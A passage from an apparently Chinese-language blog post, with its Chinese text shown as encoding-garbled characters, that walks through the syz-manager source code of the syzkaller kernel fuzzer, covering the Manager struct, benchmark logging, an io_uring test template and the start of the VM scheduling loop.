to init asset storage: %v&quot;</span>, err)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿç€å‡½æ•°æµç¨‹å¾€ä¸‹èµ°ï¼Œé¦–å…ˆè¿™é‡Œä¼šåˆ›å»ºä¸€ä¸ª<code>Manager</code>å®ä¾‹ï¼Œç„¶åä¸‹é¢å››ä¸ªå‡½æ•°çš„ä½œç”¨åˆ†åˆ«æ˜¯:</p><p><code>mgr.preloadCorpus()</code>: æ£€æŸ¥ <code>corpus.db</code> æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼ˆè‹¥ä¸å­˜åœ¨åˆ™åˆ›å»ºï¼‰å¹¶è½½å…¥ <code>sys/linux/test</code> ç›®å½•ä¸‹çš„æµ‹è¯•ç”¨æ¨¡æ¿</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># Create an io_uring instance</span><br><span class="line">r0 = syz_io_uring_setup(<span class="number">0xF00</span>, &amp;AUTO=&#123;<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="string">&quot;000000000000000000000000&quot;</span>, [<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>], [<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>]&#125;, &amp;AUTO=&lt;r1=&gt;<span class="number">0x0</span>, &amp;AUTO=&lt;r2=&gt;<span class="number">0x0</span>)</span><br><span class="line"># Set IORING_CQ_EVENTFD_DISABLED. Has no side-effect <span class="keyword">for</span> the test,</span><br><span class="line"><span class="meta"># only tests syz_memcpy_off().</span></span><br><span class="line">syz_memcpy_off$IO_URING_METADATA_FLAGS(r1, <span class="number">0x114</span>, &amp;AUTO=<span class="number">0x1</span>, <span class="number">0x0</span>, AUTO)</span><br><span class="line"># Write an openat2 operation to the submission <span class="built_in">queue</span></span><br><span class="line">syz_io_uring_submit(r1, r2, &amp;AUTO=@IORING_OP_OPENAT2=&#123;AUTO, <span class="number">0x0</span>, AUTO, <span class="number">0xffffffffffffff9c</span>, &amp;AUTO=&#123;<span class="number">0x42</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;, &amp;AUTO=<span class="string">&#x27;./file1\x00&#x27;</span>, AUTO, AUTO, <span class="number">0x12345</span>, &#123;AUTO, <span class="number">0x0</span>, <span class="string">&quot;0000000000000000000000000000000000000000&quot;</span>&#125;&#125;)</span><br><span class="line"># Notify the kernel about the submission <span class="keyword">and</span> wait until completion</span><br><span class="line">io_uring_enter(r0, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>)</span><br><span class="line"># Get the resulting fd from the completion <span class="built_in">queue</span></span><br><span class="line">r3 = syz_io_uring_complete(r1)</span><br><span class="line"># Close the file</span><br><span class="line">close(r3)</span><br></pre></td></tr></table></figure><p>å¦‚ä¸Šæ˜¯<code>sys/linux/test/io_uring</code>æ¨¡æ¿</p><p><code>mgr.initStates()</code>: æ³¨å†Œä¸€ä¸ª prometheus ç›‘è§†å™¨ï¼ˆä¸€ä¸ªå¼€æºçš„ç›‘è§†&amp;é¢„è­¦å·¥å…·åŒ…ï¼‰</p><p> <code>mgr.initHTTP()</code>: åˆ›å»ºä¸€ä¸ª HTTP æœåŠ¡å™¨å¹¶æ³¨å†Œä¸€ç³»åˆ—çš„ç›®å½•</p><p><code>mgr.collectUsedFiles()</code>: æ£€æŸ¥æ‰€éœ€æ–‡ä»¶æ˜¯å¦å­˜åœ¨</p><p>éšåé€šè¿‡<code>startRPCServer</code>å‡½æ•°åˆ›å»ºä¸€ä¸ª<code>RPC</code>æœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨ç”¨äºHostä¸<code>Guest VMs</code>è¿›è¡Œé€šä¿¡ã€‚æœ€ååˆå§‹åŒ–<code>dashboard</code>ç›¸å…³å†…å®¹ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Manager <span class="keyword">struct</span> &#123;</span><br><span class="line">cfg            *mgrconfig.Config</span><br><span class="line">vmPool         *vm.Pool</span><br><span class="line">target         *prog.Target</span><br><span class="line">sysTarget      *targets.Target</span><br><span class="line">reporter       *report.Reporter</span><br><span class="line">crashdir       <span class="keyword">string</span></span><br><span class="line">serv           *RPCServer</span><br><span class="line">corpusDB       *db.DB</span><br><span class="line">startTime      time.Time</span><br><span class="line">firstConnect   time.Time</span><br><span class="line">fuzzingTime    time.Duration</span><br><span class="line">stats          *Stats</span><br><span class="line">crashTypes     <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span></span><br><span class="line">vmStop         <span class="keyword">chan</span> <span class="keyword">bool</span></span><br><span class="line">checkResult    *rpctype.CheckArgs</span><br><span class="line">fresh          <span class="keyword">bool</span></span><br><span class="line">numFuzzing     <span class="keyword">uint32</span></span><br><span class="line">numReproducing <span class="keyword">uint32</span></span><br><span class="line"></span><br><span class="line">dash *dashapi.Dashboard</span><br><span class="line"></span><br><span class="line">mu                    sync.Mutex</span><br><span class="line">phase                 <span class="keyword">int</span></span><br><span class="line">targetEnabledSyscalls <span class="keyword">map</span>[*prog.Syscall]<span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line">candidates       []rpctype.Candidate <span class="comment">// untriaged inputs from corpus and hub</span></span><br><span class="line">disabledHashes   <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">corpus           <span class="keyword">map</span>[<span class="keyword">string</span>]CorpusItem</span><br><span class="line">seeds            [][]<span class="keyword">byte</span></span><br><span class="line">newRepros        [][]<span class="keyword">byte</span></span><br><span class="line">lastMinCorpus    <span class="keyword">int</span></span><br><span class="line">memoryLeakFrames <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span></span><br><span class="line">dataRaceFrames   <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span></span><br><span class="line">saturatedCalls   <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line">needMoreRepros <span class="keyword">chan</span> <span class="keyword">chan</span> <span class="keyword">bool</span></span><br><span class="line">hubReproQueue  <span class="keyword">chan</span> *Crash</span><br><span class="line">reproRequest   <span class="keyword">chan</span> <span class="keyword">chan</span> <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// For checking that files that we are using are not changing under us.</span></span><br><span class="line"><span class="comment">// Maps file name to modification time.</span></span><br><span class="line">usedFiles <span class="keyword">map</span>[<span class="keyword">string</span>]time.Time</span><br><span class="line"></span><br><span class="line">modules            []host.KernelModule</span><br><span class="line">coverFilter        <span class="keyword">map</span>[<span class="keyword">uint32</span>]<span class="keyword">uint32</span></span><br><span class="line">coverFilterBitmap  []<span class="keyword">byte</span></span><br><span class="line">modulesInitialized <span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line">assetStorage *asset.Storage</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°å°±æ˜¯<code>Manager</code>ç»“æ„ä½“ï¼Œè¿™é‡Œåªè¯´å‡ ä¸ªé‡è¦çš„æˆå‘˜ï¼š</p><ul><li>  <code>cfg</code>: åŸºæœ¬è®¾ç½®ä¿¡æ¯ï¼Œå­˜æ”¾åœ¨ä¸€ä¸ªjsonæ–‡ä»¶ä¸­</li><li>  <code>vmPool</code>: æ‰€ç”¨çš„<code>vm Pool</code></li><li>  <code>reporter</code>: ç”¨ä»¥æŠ¥å‘Š<code>crash</code></li><li>  <code>serv</code>: <code>RPC server</code>ç”¨äºä¸<code>Guest VM</code>é€šä¿¡</li><li>  <code>corpusDB</code>: ç”¨äºå­˜æ”¾è¯­æ–™çš„æ•°æ®åº“</li><li>  <code>targetEnabledSyscalls</code>: æµ‹è¯•ç”¨ä¾‹æ‰€å…è®¸ä½¿ç”¨çš„ç³»ç»Ÿè°ƒç”¨</li><li>  <code>candidates</code>: å¾…æ‰§è¡Œæµ‹è¯•ç”¨ä¾‹</li><li>  <code>corpus</code>: è¯­æ–™åº“</li><li>  <code>seeds</code>: ç”¨æ¥å¯¹è¯­æ–™åº“å˜å¼‚çš„ç§å­</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="keyword">for</span> lastTime := time.Now(); ; &#123;</span><br><span class="line">    time.Sleep(<span class="number">10</span> * time.Second)</span><br><span class="line">    now := time.Now()</span><br><span class="line">    diff := now.Sub(lastTime)</span><br><span class="line">    lastTime = now</span><br><span class="line">    mgr.mu.Lock()</span><br><span class="line">    <span class="keyword">if</span> mgr.firstConnect.IsZero() &#123;</span><br><span class="line">      mgr.mu.Unlock()</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br><span class="line">    mgr.fuzzingTime += diff * time.Duration(atomic.LoadUint32(&amp;mgr.numFuzzing))</span><br><span class="line">    executed := mgr.stats.execTotal.get()</span><br><span class="line">    crashes := mgr.stats.crashes.get()</span><br><span class="line">    corpusCover := mgr.stats.corpusCover.get()</span><br><span class="line">    corpusSignal := mgr.stats.corpusSignal.get()</span><br><span class="line">    maxSignal := mgr.stats.maxSignal.get()</span><br><span class="line">    triageQLen := <span class="built_in">len</span>(mgr.candidates)</span><br><span class="line">    mgr.mu.Unlock()</span><br><span class="line">    numReproducing := atomic.LoadUint32(&amp;mgr.numReproducing)</span><br><span class="line">    numFuzzing := atomic.LoadUint32(&amp;mgr.numFuzzing)</span><br><span class="line"></span><br><span class="line">    log.Logf(<span class="number">0</span>, <span class="string">&quot;VMs %v, executed %v, cover %v, signal %v/%v, crashes %v, repro %v, triageQLen %v&quot;</span>,</span><br><span class="line">             numFuzzing, executed, corpusCover, corpusSignal, maxSignal, crashes, numReproducing, triageQLen)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šæ–°èµ·ä¸€ä¸ªå†™æˆè¿›è¡Œæ•°æ®è®°å½•çš„å·¥ä½œï¼Œå‡½æ•°å†…éƒ¨å°±æ˜¯ä¸€ä¸ªforå¾ªç¯å¹¶ä¸”æ²¡æœ‰åœæ­¢çš„ï¼Œå…¶ä½œç”¨å°±æ˜¯æ¯éš”åç§’è¿›è¡Œä¸€æ¬¡è¿›åº¦é‡‡é›†å¹¶è¾“å‡ºæ—¥å¿—ï¼Œä¸»è¦æ˜¯é‡‡é›†æ‰§è¡Œä¿¡æ¯ã€è¯­æ–™è¦†ç›–ç‡ã€crashes ä¿¡æ¯ç­‰ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> *flagBench != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">  mgr.initBench()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> mgr.dash != <span class="literal">nil</span> &#123;</span><br><span class="line">  <span class="keyword">go</span> mgr.dashboardReporter()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">osutil.HandleInterrupts(vm.Shutdown)</span><br><span class="line"><span class="keyword">if</span> mgr.vmPool == <span class="literal">nil</span> &#123;</span><br><span class="line">  log.Logf(<span class="number">0</span>, <span class="string">&quot;no VMs started (type=none)&quot;</span>)</span><br><span class="line">  log.Logf(<span class="number">0</span>, <span class="string">&quot;you are supposed to start syz-fuzzer manually as:&quot;</span>)</span><br><span class="line">  log.Logf(<span class="number">0</span>, <span class="string">&quot;syz-fuzzer -manager=manager.ip:%v [other flags as necessary]&quot;</span>, mgr.serv.port)</span><br><span class="line">  &lt;-vm.Shutdown</span><br><span class="line">  <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">mgr.vmLoop()</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œè¿™é‡Œä¼šå…ˆåˆ¤æ–­<code>flagBench</code>æ˜¯å¦ä¸ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œå¦‚æœä¸ä¸ºç©ºå­—ç¬¦ä¸²åˆ™è°ƒç”¨<code>initBench</code>å‡½æ•°ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">flagConfig = flag.String(<span class="string">&quot;config&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;configuration file&quot;</span>)</span><br><span class="line">flagDebug  = flag.Bool(<span class="string">&quot;debug&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;dump all VM output to console&quot;</span>)</span><br><span class="line">flagBench  = flag.String(<span class="string">&quot;bench&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;write execution statistics into this file periodically&quot;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>flagBench</code>æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œä½¿ç”¨çš„æ˜¯<code>golang</code>çš„flagåŒ…è§£æå‘½ä»¤è¡Œã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mgr *Manager)</span> <span class="title">initBench</span><span class="params">()</span></span> &#123;</span><br><span class="line">f, err := os.OpenFile(*flagBench, os.O_WRONLY|os.O_CREATE|os.O_EXCL, osutil.DefaultFilePerm)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;failed to open bench file: %v&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">time.Sleep(time.Minute)</span><br><span class="line">vals := mgr.stats.all()</span><br><span class="line">mgr.mu.Lock()</span><br><span class="line"><span class="keyword">if</span> mgr.firstConnect.IsZero() &#123;</span><br><span class="line">mgr.mu.Unlock()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">mgr.minimizeCorpus()</span><br><span class="line">vals[<span class="string">&quot;corpus&quot;</span>] = <span class="keyword">uint64</span>(<span class="built_in">len</span>(mgr.corpus))</span><br><span class="line">vals[<span class="string">&quot;uptime&quot;</span>] = <span class="keyword">uint64</span>(time.Since(mgr.firstConnect)) / <span class="number">1e9</span></span><br><span class="line">vals[<span class="string">&quot;fuzzing&quot;</span>] = <span class="keyword">uint64</span>(mgr.fuzzingTime) / <span class="number">1e9</span></span><br><span class="line">vals[<span class="string">&quot;candidates&quot;</span>] = <span class="keyword">uint64</span>(<span class="built_in">len</span>(mgr.candidates))</span><br><span class="line">mgr.mu.Unlock()</span><br><span class="line"></span><br><span class="line">data, err := json.MarshalIndent(vals, <span class="string">&quot;&quot;</span>, <span class="string">&quot;  &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;failed to serialize bench data&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> _, err := f.Write(<span class="built_in">append</span>(data, <span class="string">&#x27;\n&#x27;</span>)); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;failed to write bench data&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>initBench</code>ä¼šå¯åŠ¨ä¸€ä¸ªåç¨‹ï¼Œè¿™ä¸ªåç¨‹ä¼šæ¯éš”ä¸€åˆ†é’Ÿå¾ªç¯ä¸€æ¬¡ï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯è°ƒç”¨<code>minimizeCorpus</code>å°†è¯­æ–™åº“è¿›è¡Œæœ€å°åŒ–ï¼Œæƒ³<code>bench</code>å‚æ•°æŒ‡å®šçš„æ–‡ä»¶å†™å…¥è¯­æ–™åº“é•¿åº¦ã€å¯åŠ¨æ—¶é—´ã€fuzzing æ—¶é—´ã€‚</p><p>å›åˆ°<code>RunManager</code>å‡½æ•°ä¸­ï¼Œæ¥ä¸‹æ¥åˆä¼šè°ƒç”¨<code>dashboardReporter</code>å¯åŠ¨ä¸€ä¸ªæ–°çš„åç¨‹ï¼Œè¿™é‡Œçš„ä½œç”¨å°±æ˜¯æ¯éš”ä¸€åˆ†é’Ÿä¸ŠæŠ¥ä¸€æ¬¡<code>syz-manager</code>çš„çŠ¶æ€ã€‚</p><p>æœ€åæ£€æŸ¥ä¸€ä¸‹<code>VM Pool</code>å¹¶è°ƒç”¨<code>vmloop</code>å‡½æ•°ã€‚</p><h2 id="vmloopå‡½æ•°"><a href="#vmloopå‡½æ•°" class="headerlink" title="vmloopå‡½æ•°"></a>vmloopå‡½æ•°</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Manager needs to be refactored (#605).</span></span><br><span class="line"><span class="comment">// nolint: gocyclo, gocognit, funlen</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mgr *Manager)</span> <span class="title">vmLoop</span><span class="params">()</span></span> &#123;</span><br><span class="line">log.Logf(<span class="number">0</span>, <span class="string">&quot;booting test machines...&quot;</span>)</span><br><span class="line">log.Logf(<span class="number">0</span>, <span class="string">&quot;wait for the connection from test machine...&quot;</span>)</span><br><span class="line">instancesPerRepro := <span class="number">3</span></span><br><span class="line">vmCount := mgr.vmPool.Count()</span><br><span class="line">maxReproVMs := vmCount - mgr.cfg.FuzzingVMs</span><br><span class="line"><span class="keyword">if</span> instancesPerRepro &gt; maxReproVMs &amp;&amp; maxReproVMs &gt; <span class="number">0</span> &#123;</span><br><span class="line">instancesPerRepro = maxReproVMs</span><br><span class="line">&#125;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡½æ•°é¦–å…ˆå¯¹VMè¿›è¡Œåˆ†ç»„ï¼Œä¸€å…±åˆ†ä¸ºä¸¤ç»„ï¼Œä¸€ç»„è´Ÿè´£<code>fuzzing</code>ï¼Œä¸€ç»„è´Ÿè´£å¤ç°<code>crash</code>( maxReproVMs )ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">instances := SequentialResourcePool(vmCount, <span class="number">10</span>*time.Second*mgr.cfg.Timeouts.Scale)</span><br><span class="line">runDone := <span class="built_in">make</span>(<span class="keyword">chan</span> *RunResult, <span class="number">1</span>)</span><br><span class="line">pendingRepro := <span class="built_in">make</span>(<span class="keyword">map</span>[*Crash]<span class="keyword">bool</span>)</span><br><span class="line">reproducing := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>)</span><br><span class="line"><span class="keyword">var</span> reproQueue []*Crash</span><br><span class="line">reproDone := <span class="built_in">make</span>(<span class="keyword">chan</span> *ReproResult, <span class="number">1</span>)</span><br><span class="line">stopPending := <span class="literal">false</span></span><br><span class="line">shutdown := vm.Shutdown</span><br></pre></td></tr></table></figure><p>æ¥ç€ä¼šè°ƒç”¨<code>SequentialResourcePool</code>å‡½æ•°æ–°å»ºä¸€ä¸ª<code>ResourcePool</code>é˜Ÿåˆ—ï¼Œä¸»è¦è´Ÿè´£å¯¹ç©ºé—²çš„VMçš„ä½¿ç”¨é¡ºåºè¿›è¡Œè°ƒæ§ã€‚</p><p>éšåä¼šåˆå§‹åŒ–ä¸€ç³»åˆ—çš„å˜é‡ï¼š</p><ul><li>  <code>runDone</code>ï¼šä¿å­˜ fuzzing ç»“æœä¸º crash çš„ Crash é˜Ÿåˆ—</li><li>  <code>pendingRepro</code>ï¼šæ ‡è¯†å¾…å¤ç°çš„ Crash</li><li>  <code>reproducing</code>ï¼šæ ‡è¯†æŸä¸ªç±»å‹ Crash æ˜¯å¦å‡†å¤‡è¢«å¤ç°</li><li>  <code>reproQueue</code>ï¼šCrash çš„å¤ç°é˜Ÿåˆ—</li><li>  <code>reproDone</code>ï¼šCrash çš„å¤ç°ç»“æœ</li><li>  <code>stopPending</code>ï¼šç­‰å¾…åœæ­¢æ ‡å¿—ä½</li><li>  <code>shutdown</code>ï¼šå·¥ä½œç»ˆæ­¢æ ‡å¿—ä½</li></ul><p>æœ€åè¿›å…¥åˆ°ä¸€ä¸ªå¤§å¾ªç¯ä¸­ï¼Œè€Œè¿™ä¸ªå¤§å¾ªç¯æ‰æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„<code>fuzzing</code>è°ƒæ§æµç¨‹ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> shutdown != <span class="literal">nil</span> || instances.Len() != vmCount &#123;</span><br><span class="line">mgr.mu.Lock()</span><br><span class="line">phase := mgr.phase</span><br><span class="line">mgr.mu.Unlock()</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤§å¾ªç¯ç»ˆæ­¢å¾ªç¯çš„æ¡ä»¶æ˜¯<code>shutdown != nil</code>æˆ–è€…<code>ResourcePool</code>ä¸­çš„VMæ•°é‡ä¸æ€»æ•°é‡ä¸ç›¸ç­‰ï¼Œè¿›å…¥å¾ªç¯åé¦–å…ˆåšçš„äº‹å°±æ˜¯è·å–å½“å‰æ‰€è¿›è¡Œçš„é˜¶æ®µã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> crash := <span class="keyword">range</span> pendingRepro &#123;</span><br><span class="line">  <span class="keyword">if</span> reproducing[crash.Title] &#123;</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">delete</span>(pendingRepro, crash)</span><br><span class="line">  <span class="keyword">if</span> !mgr.needRepro(crash) &#123;</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">  &#125;</span><br><span class="line">  log.Logf(<span class="number">1</span>, <span class="string">&quot;loop: add to repro queue &#x27;%v&#x27;&quot;</span>, crash.Title)</span><br><span class="line">  reproducing[crash.Title] = <span class="literal">true</span></span><br><span class="line">  reproQueue = <span class="built_in">append</span>(reproQueue, crash)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç´§æ¥ç€è¿›å…¥åˆ°å†…å±‚å°å¾ªç¯ï¼Œè¿™é‡Œä¼šéå†<code>reproducing</code>ä¸­çš„<code>crash</code>ï¼Œå¦‚æœæ²¡æœ‰è¢«å¤ç°è¿‡åˆ™ä»<code>pendingRepro</code>ä¸­åˆ é™¤ï¼Œéšåè°ƒç”¨<code>mgr.needRepro</code>æ¥çœ‹<code>crash</code>æ˜¯å¦éœ€è¦è¢«å¤ç°ï¼Œåé¢æ ‡è®°è¯¥æ ‡é¢˜çš„<code>crash</code>ä¸ºå·²å¤ç°ï¼Œæœ€ååŠ å…¥åˆ°å¤ç°çš„é˜Ÿåˆ—ä¸­ã€‚</p><p>è¿™é‡Œçš„<code>crash.Title</code>ä¸ºOopsçš„ç¬¬ä¸€è¡Œæ–‡æœ¬ï¼Œä»ä¸Šé¢çš„é€»è¾‘å¯ä»¥çœ‹å‡ºæ¥ï¼Œä¸€æ¬¡åªèƒ½å¤ç°åŒç±»<code>crash</code>ä¸­çš„ä¸€ä¸ªã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">log.Logf(<span class="number">1</span>, <span class="string">&quot;loop: phase=%v shutdown=%v instances=%v/%v %+v repro: pending=%v reproducing=%v queued=%v&quot;</span>,</span><br><span class="line">         phase, shutdown == <span class="literal">nil</span>, instances.Len(), vmCount, instances.Snapshot(),</span><br><span class="line">         <span class="built_in">len</span>(pendingRepro), <span class="built_in">len</span>(reproducing), <span class="built_in">len</span>(reproQueue))</span><br><span class="line"></span><br><span class="line">canRepro := <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">  <span class="keyword">return</span> phase &gt;= phaseTriagedHub &amp;&amp; <span class="built_in">len</span>(reproQueue) != <span class="number">0</span> &amp;&amp;</span><br><span class="line">  (<span class="keyword">int</span>(atomic.LoadUint32(&amp;mgr.numReproducing))+<span class="number">1</span>)*instancesPerRepro &lt;= maxReproVMs</span><br><span 